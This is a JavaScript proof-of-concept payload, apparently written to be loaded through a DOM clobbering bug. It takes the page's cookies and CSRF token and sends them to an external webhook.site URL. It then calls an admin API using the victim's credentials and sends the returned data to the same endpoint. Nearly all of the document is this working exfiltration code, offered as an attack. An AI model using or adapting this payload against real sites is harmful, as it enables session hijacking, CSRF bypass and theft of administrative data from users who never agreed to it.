// ============================================
// DOM Clobbering PoC - Multiple Impact Proofs
// ============================================

// 1. Prove Script Execution
console.log("🚨 EXPLOIT: Script loaded successfully!");
alert("🔴 DOM Clobbering Exploit Executed!");

// 2. Steal Cookies (if any)
const cookies = document.cookie;
if (cookies) {
    console.log("🍪 Cookies stolen:", cookies);
    fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?cookies=' + encodeURIComponent(cookies));
}

// 3. Extract CSRF Tokens
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
if (csrfToken) {
    console.log("🔑 CSRF Token stolen:", csrfToken);
    fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?csrf=' + encodeURIComponent(csrfToken));
}

// 4. Check for Admin Access
const userRole = sessionStorage.getItem('user_role') || localStorage.getItem('user_role');
if (userRole === 'admin') {
    console.log("👑 ADMIN ACCESS CONFIRMED!");
    alert("✅ You have been escalated to ADMIN!");
}

// 5. Attempt an Admin Action
fetch('/api/admin/users', {
    credentials: 'include',
    headers: { 'Accept': 'application/json' }
})
.then(r => {
    if (r.status === 200) {
        console.log("✅ Admin API accessed successfully!");
        return r.json();
    }
})
.then(data => {
    if (data) {
        console.log("📊 Admin Data Exposed:", data);
        fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?admin_data=' + encodeURIComponent(JSON.stringify(data)));
    }
})
.catch(e => console.log("⚠️ Admin API not accessible"));

// 6. Show the Attack Chain
console.log("✅ Attack Chain Complete:");
console.log("   1. DOM Clobbering injected");
console.log("   2. External script loaded");
console.log("   3. JavaScript executed");
console.log("   4. Sensitive data stolen");